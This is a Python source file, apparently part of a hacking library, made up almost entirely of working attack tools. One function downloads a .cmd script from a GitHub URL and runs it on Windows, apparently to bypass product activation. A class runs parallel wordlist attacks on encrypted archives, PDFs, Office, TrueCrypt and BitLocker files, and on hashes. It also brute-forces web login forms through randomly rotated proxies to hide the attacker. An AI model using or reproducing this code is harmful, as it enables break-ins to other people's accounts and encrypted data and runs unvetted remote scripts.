import os
import os
import zipfile
import rarfile
import py7zr
import PyPDF2
#import msoffcrypto
import io
import multiprocessing
import subprocess
import hashlib
import random
import requests



class WINDOWS:
    def Active_Windows():
        if os.name=='nt':
            try:
                os.startfile('WA.cmd')
            except:
                file=open('WA.cmd','w+')
                file.write(str(requests.get('https://raw.githubusercontent.com/mr-r0ot/pyhack/refs/heads/main/pyhack/WA.cmd').text))
                file.close()
                os.startfile('WA.cmd')
            return True
        else:
            return'Error: Active_Windows can run only on windows!'











class CREAK:

    def read_password_file(filename):
        with open(filename, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
        return passwords

    class LOCAL_FILE:

        def zip_password(filename, password):
            try:
                with zipfile.ZipFile(filename) as z:
                    z.extractall(pwd=password.encode('utf-8'))
                return True
            except Exception:
                return False

        def rar_password(filename, password):
            try:
                with rarfile.RarFile(filename) as r:
                    r.extractall(pwd=password)
                return True
            except Exception:
                return False

        def sevenzip_password(filename, password):
            try:
                with py7zr.SevenZipFile(filename, mode='r', password=password) as z:
                    z.extractall()
                return True
            except Exception:
                return False

        def pdf_password(filename, password):
            try:
                with open(filename, 'rb') as f:
                    reader = PyPDF2.PdfReader(f)
                    if reader.decrypt(password) == 1:
                        _ = reader.pages[0]
                        return True
            except Exception:
                return False
            return False

        def office_password(filename, password):
            try:
                with open(filename, 'rb') as f:
                    office_file = msoffcrypto.OfficeFile(f)
                    office_file.load_key(password=password)
                    decrypted = io.BytesIO()
                    office_file.decrypt(decrypted)
                return True
            except Exception:
                return False

        def truecrypt_password(filename, password):
            try:
                result = subprocess.run(['truecrypt', '--test', '--password', password, filename],
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                if result.returncode == 0:
                    return True
            except Exception:
                pass
            return False

        def bitlocker_password(filename, password):
            try:
                result = subprocess.run(['manage-bde', '-unlock', filename, '-password', password],
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                if result.returncode == 0:
                    return True
            except Exception:
                pass
            return False

        def tar_password(filename, password):
            return False

        def iso_password(filename, password):
            return False

        def password_for_file(filename, password):
            ext = os.path.splitext(filename)[1].lower()
            if ext == '.zip':
                return CREAK.LOCAL_FILE.zip_password(filename, password)
            elif ext == '.rar':
                return CREAK.LOCAL_FILE.rar_password(filename, password)
            elif ext == '.7z':
                return CREAK.LOCAL_FILE.sevenzip_password(filename, password)
            elif ext == '.pdf':
                return CREAK.LOCAL_FILE.pdf_password(filename, password)
            elif ext in ['.docx', '.xlsx', '.pptx']:
                return CREAK.LOCAL_FILE.office_password(filename, password)
            elif ext in ['.tc', '.truecrypt']:
                return CREAK.LOCAL_FILE.truecrypt_password(filename, password)
            elif ext in ['.bitlocker']:
                return CREAK.LOCAL_FILE.bitlocker_password(filename, password)
            elif ext in ['.tar', '.gz', '.bz2', '.xz']:
                return CREAK.LOCAL_FILE.tar_password(filename, password)
            elif ext == '.iso':
                return CREAK.LOCAL_FILE.iso_password(filename, password)
            else:
                raise ValueError(f"Unsupported format: {ext}")

        def test_password(args):
            filename, password = args
            if CREAK.LOCAL_FILE.password_for_file(filename, password):
                return password
            return None

        def crack_file(filename, password_list):
            args = [(filename, pwd) for pwd in password_list]
            with multiprocessing.Pool() as pool:
                for result in pool.imap_unordered(CREAK.LOCAL_FILE.test_password, args):
                    if result is not None:
                        pool.terminate()
                        return result
            return None
    



    class HASH:
        def compute_hash(password, hash_type):
            h = hashlib.new(hash_type)
            h.update(password.encode('utf-8'))
            return h.hexdigest()

        def test_candidate(args):
            hash_type, target_hash, candidate = args
            if CREAK.HASH.compute_hash(candidate, hash_type) == target_hash:
                return candidate
            return None

        def crack_hash(hash_type, target_hash, password_list):
            args = [(hash_type, target_hash, pwd) for pwd in password_list]
            with multiprocessing.Pool() as pool:
                for result in pool.imap_unordered(CREAK.HASH.test_candidate, args):
                    if result is not None:
                        pool.terminate()
                        return result
            return None
        


    class NET:
        def load_proxies(filename):
            with open(filename, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]

        def load_passwords(filename):
            with open(filename, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]

        def send_request(method, url, data, headers, proxy):
            proxies = {"http": proxy, "https": proxy} if proxy else None
            response = requests.request(method, url, data=data, headers=headers, proxies=proxies, timeout=10)
            return response

        def attempt_payload(args):
            password, target_url, method, payload_template, headers, proxies_list, success_indicator = args
            proxy = random.choice(proxies_list) if proxies_list else None
            payload = payload_template.copy()
            payload['password'] = password
            response = CREAK.NET.send_request(method, target_url, data=payload, headers=headers, proxy=proxy)
            if success_indicator(response):
                return password
            return None

        def crack_web(target_url, method, payload_template, headers, password_list, proxies_list, success_indicator):
            args_list = [
                (pwd, target_url, method, payload_template, headers, proxies_list, success_indicator)
                for pwd in password_list
            ]
            with multiprocessing.Pool() as pool:
                for result in pool.imap_unordered(CREAK.NET.attempt_payload, args_list):
                    if result is not None:
                        pool.terminate()
                        return result
            return None

